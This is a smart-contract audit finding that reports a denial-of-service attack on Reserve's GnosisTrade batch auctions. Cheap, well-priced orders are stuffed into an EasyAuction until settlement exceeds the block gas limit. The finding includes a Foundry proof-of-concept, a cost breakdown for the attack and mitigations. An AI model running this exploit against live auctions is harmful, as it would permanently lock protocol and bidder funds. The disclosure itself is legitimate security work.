# #19: GnosisTrade's MAX_ORDERS limit can be circumvented to DoS RToken recollateralization
Labels: ['bug', '3 (High Risk)', 'primary issue', 'sponsor disputed', 'sufficient quality report', 'unsatisfactory', ':robot:_primary']
Accepted: True

# Lines of code

https://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/plugins/trading/GnosisTrade.sol#L125


# Vulnerability details

The GnosisTrade contract leverages the Gnosis EasyAuction contract for batch sales.

This contract has a limitation in the fact that its settlement function has a potentially unbounded loop that can cause auctions with large numbers of orders to not be settled:

```Solidity
File: EasyAuction.sol
450:     // @dev function settling the auction and calculating the price
451:     function settleAuction(uint256 auctionId)
452:         public
453:         atStageSolutionSubmission(auctionId)
454:         returns (bytes32 clearingOrder)
455:     {
---
468:         do {
469:             bytes32 nextOrder = sellOrders[auctionId].next(currentOrder);
470:             if (nextOrder == IterableOrderedOrderSet.QUEUE_END) {
471:                 break;
472:             }
473:             currentOrder = nextOrder;
474:             (, buyAmountOfIter, sellAmountOfIter) = currentOrder.decodeOrder();
475:             currentBidSum = currentBidSum.add(sellAmountOfIter);
476:             console.log("CurrentBidSum %d, buyAmountOfIter %d", currentBidSum, buyAmountOfIter);
477:         } while (
478:             currentBidSum.mul(buyAmountOfIter) <
479:                 fullAuctionedAmount.mul(sellAmountOfIter)
480:         );
```

This particular limitation appears to be known to the Reserve team, and addressed via the introduction of two constants: `MAX_ORDERS` and `DEFAULT_MIN_BID`:

```Solidity
File: GnosisTrade.sol
27:     // Upper bound for the max number of orders we're happy to have the auction clear in;
28:     // When we have good price information, this determines the minimum buy amount per order.
29:     uint96 public constant MAX_ORDERS = 5000; // bounded to avoid going beyond block gas limit
30: 
31:     // raw "/" for compile-time const
32:     uint192 public constant DEFAULT_MIN_BID = FIX_ONE / 100; // {tok}
---
122:         // Don't decrease minBuyAmount even if fees are in effect. The fee is part of the slippage
123:         uint96 minBuyAmount = uint96(Math.max(1, req.minBuyAmount)); // Safe downcast; require'd
124: 
125:         uint256 minBuyAmtPerOrder = Math.max(
126:             minBuyAmount / MAX_ORDERS,
127:             DEFAULT_MIN_BID.shiftl_toUint(int8(buy.decimals()))
128:         );
```

This mitigation is however insufficient if we consider the following facts:
1. the EasyAuction contract sorts orders with the best prices first
2. sending a single order can be extremely cheap (for example for USDC, DEFAULT_MIN_BID corresponds to $0.01)
3. orders can be sent to EasyAuction in batches
4. EasyAuction keeps receiving new orders for as long as the auction is open, regardless of how many were received before and for what amount 
5. settlement processes orders in their sorted sequence

It is possible to leverage the above properties to submit orders at a (small) loss in tokens, and a larger consumption in Gas, to stuff an auction with many small orders, however with a very good price, up to the point where it can't settle because the operation would exceed the 30M gas allowed for a whole block.

## Impact
An in-progress rebalancing can be DoS'ed for a reasonably low monetary value on top of gas (the breakdown of the cost of this attack is detailed with the PoC below).

When the in-progress rebalancing operation is stuck on a trade that can't settle:
- [The revenue distribution is disrupted](https://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/BackingManager.sol#L187)
- [BackingManager can't initiate](https://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/BackingManager.sol#L120) any new rebalancing operations to recollateralize the current or a new basket
- The GnosisTrade contract loses permanently the tokens it auctioned for sale
- Any legitimate buyers in the batch auction lose permanently the tokens they bid in the auction

## Proof of Concept
The following Foundry PoC simulates how a [real GnosisTrade auction on mainnet](https://app.blocksec.com/explorer/tx/eth/0x0180d86c982ae73adc78051503965605f964a4c5ebdf6b8554599716bcc8d1a1) could have been DoS'ed by sending a few dozens 500-order request (less than $400 in USDT in total) that make the auction impossible to settle within the block gas limit of 30M.

The cost in gas is about ~25M per each of the 500-order block, totaling [about $14k on Ethereum and about $470 on Arbitrum or Optimism](https://www.cryptoneur.xyz/en/gas-fees-calculator?gas-input=15000000&gas-price-option=on&usedGas=25000000&txnType=Custom), bringing the full cost of an attack to about $15k on Ethereum mainnet and a very reasonable $1k on rollup chains.

To run the PoC, you'll need to add it to [the EasyAuction project](https://github.com/gnosis/ido-contracts) after adapting it to use Foundry (we can make one adapted fork available upon request):

<details>
  <summary>Coded PoC</summary>

```Solidity
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "contracts/EasyAuction.sol";
import "contracts/test/ERC20Mintable.sol";

import "forge-std/Test.sol";

contract H1 is Test {
    function testH1() public {
        vm.pauseGasMetering();

        ERC20Mintable wstETH = new ERC20Mintable("wstETH", "wstETH"); // wstETH (auctioningToken)
        ERC20Mintable USDT = new ERC20Mintable("USDT", "USDT"); // USDT (biddingToken)

        vm.label(address(wstETH), "wstETH");
        vm.label(address(USDT), "USDT");

        EasyAuction ea = new EasyAuction();

        wstETH.mint(address(this), 198747025075165);
        wstETH.approve(address(ea), 198747025075165);

        // Real creation:
        // https://app.blocksec.com/explorer/tx/eth/0x0180d86c982ae73adc78051503965605f964a4c5ebdf6b8554599716bcc8d1a1
        vm.roll(17006876);
        vm.warp(1680988835);
        uint auctionId = ea.initiateAuction(
            wstETH, 
            USDT, 
            1680996334, 
            1680996334, 
            198747025075165, 
            401131, 
            10000, 
            0, 
            false, 
            address(0), 
            "");

        // Real bid: https://app.blocksec.com/explorer/tx/eth/0xd1e27419e79383ed6a3d81ea337bd6a37c8b3c98ae3d391c8ebcf5e2ac4031d1
        vm.roll(17006891);
        vm.warp(1680989291);

        USDT.mint(address(this), 150_000);
        USDT.approve(address(ea), 150_000);
        address(ea).call(hex"d225269c000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000001200000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000004389677bbaee000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000249f0000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000");

        // Hypothetical interactions after the real bids
        vm.warp(1680996333);

        uint96 numOfBatches = 70;

        USDT.mint(address(this), 1_000e6);
        USDT.approve(address(ea), 1_000e6);

        uint96 ordersPerBatch = 500;
        uint96[] memory sellAmounts = new uint96[](ordersPerBatch);
        uint96[] memory minBuyAmounts = new uint96[](ordersPerBatch);
        bytes32[] memory prevOrders = new bytes32[](ordersPerBatch);

        for(uint96 i = 0; i < numOfBatches; i++) {
            for(uint96 j = 0; j < ordersPerBatch; j++) {
                // bid ~$0.01 per order to comply with DEFAULT_MIN_BID
                sellAmounts[j] = uint96(10_001) + i*ordersPerBatch + j;
                // ask as little as possible to not overlap orders
                minBuyAmounts[j] = 1;
                // top of the order book
                prevOrders[j] = 0x0000000000000000000000000000000000000000000000000000000000000001;
            }
            ea.placeSellOrders(auctionId, 
                minBuyAmounts, sellAmounts, prevOrders, "");
        }

        // After auction ends
        // https://app.blocksec.com/explorer/tx/eth/0x8554f7b23b19ecd9442e9f00165084590db213204afd03de1573560e4de42381
        vm.roll(17006914);
        vm.warp(1680996350);

        vm.resumeGasMetering();
        uint savedGas = gasleft();
        ea.settleAuction(auctionId);
        uint settleGas = savedGas - gasleft();

        console.log(settleGas);
        assertGt(settleGas, 30_000_000);
    }
}
```

</details>


## Tools Used
Code review, Foundry

## Recommended Mitigation Steps
Consider:
- flooring `minBuyAmtPerOrder` to a constant monetary value ($1 already would be enough of a disincentive, the higher the better) rather than a constant fraction of a token that may be more or less valuable
- adding an emergency action that can be triggered by the governance to abandon bricked batch auctions and limit impact on availability



## Assessed type

DoS